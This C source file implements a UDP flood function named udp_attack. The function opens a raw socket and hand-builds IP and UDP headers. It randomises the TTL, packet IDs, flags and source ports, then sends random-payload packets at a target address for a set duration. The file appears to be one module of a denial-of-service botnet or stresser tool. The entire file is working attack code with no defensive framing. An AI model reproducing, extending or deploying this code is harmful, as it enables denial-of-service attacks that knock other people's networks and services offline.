#define _GNU_SOURCE

#include "headers/udp_attack.h"
#include "headers/checksum.h"
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

void* udp_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int udp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (udp_sock < 0) {
        return NULL;
    }

    int one = 1;
    const int *val = &one;
    if (setsockopt(udp_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        close(udp_sock);
        return NULL;
    }

    int min_packet_size = sizeof(struct iphdr) + sizeof(struct udphdr);
    int packet_size = params->psize > 0 ? params->psize : 48;
    if (packet_size < min_packet_size) packet_size = min_packet_size;
    
    unsigned char *packet = malloc(packet_size);
    if (!packet) {
        close(udp_sock);
        return NULL;
    }

    unsigned char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    size_t data_len = packet_size - sizeof(struct iphdr) - sizeof(struct udphdr);
    for (size_t i = 0; i < data_len; i++) {
        data[i] = rand() & 0xFF;
    }

    struct iphdr* iph = (struct iphdr*)packet;
    struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));

    struct sockaddr_in dest_addr;
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = params->target_addr.sin_port;
    dest_addr.sin_addr = params->target_addr.sin_addr;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = (rand() % 2) ? 0x08 : 0;
    iph->tot_len = htons(packet_size);
    iph->id = htons(45876 + (rand() % 2048));
    iph->frag_off = rand() % 2 ? 0 : htons(0x4000);
    iph->ttl = (rand() % 2) ? (64 + (rand() % 64)) : (128 + (rand() % 64));
    iph->protocol = IPPROTO_UDP;
    iph->saddr = INADDR_ANY;
    iph->daddr = params->target_addr.sin_addr.s_addr;

    udph->source = htons(params->srcport > 0 ? params->srcport : ((rand() % 2) ? (1024 + (rand() % 1024)) : (10000 + (rand() % 55534))));
    udph->dest = params->target_addr.sin_port;
    udph->len = htons(packet_size - sizeof(struct iphdr));
    udph->check = 0;

    time_t end_time = time(NULL) + params->duration;
    while (params->active && time(NULL) < end_time) {
        iph->id = htons(rand() % 65535);
        iph->check = generic_checksum((unsigned short*)iph, sizeof(struct iphdr));
        udph->check = tcp_udp_checksum(udph, packet_size - sizeof(struct iphdr), iph->saddr, iph->daddr, IPPROTO_UDP);
        ssize_t sent = sendto(udp_sock, packet, packet_size, MSG_NOSIGNAL, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
        if (sent < 0) break;
    }
    free(packet);
    close(udp_sock);
    return NULL;
}
